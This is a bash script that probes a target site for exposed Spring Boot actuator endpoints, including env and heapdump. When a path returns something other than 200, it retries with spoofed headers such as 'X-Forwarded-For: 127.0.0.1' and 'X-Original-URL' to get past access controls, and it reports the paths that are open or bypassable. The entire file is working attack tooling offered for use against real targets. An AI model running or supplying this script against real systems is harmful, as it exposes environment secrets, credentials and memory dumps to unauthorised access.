#!/usr/bin/env bash
# actuator_probe.sh — Spring Boot actuator discovery + access-control bypass attempts
# usage: ./actuator_probe.sh https://target.com
U="${1%/:?}"; U="${1%/}"
PATHS="/actuator /actuator/env /actuator/heapdump /actuator/mappings /env /heapdump /management/env /admin/actuator/env"
BYP=("X-Forwarded-For: 127.0.0.1" "X-Original-URL: /actuator/env" "X-Rewrite-URL: /actuator/env")
for P in $PATHS; do
  C=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$U$P")
  [ "$C" = "000" ] && continue
  if [[ "$C" == 200 ]]; then echo "[!!] OPEN  $P (200)"; continue; fi
  for B in "${BYP[@]}"; do
    C2=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 -H "$B" "$U$P")
    [[ "$C2" == 200 ]] && echo "[!!] BYPASS works: $P with '$B'"
  done
  [[ "$C" != 404 ]] && echo "[i]  exists($C): $P — bypasses failed"
done
echo "(done)"
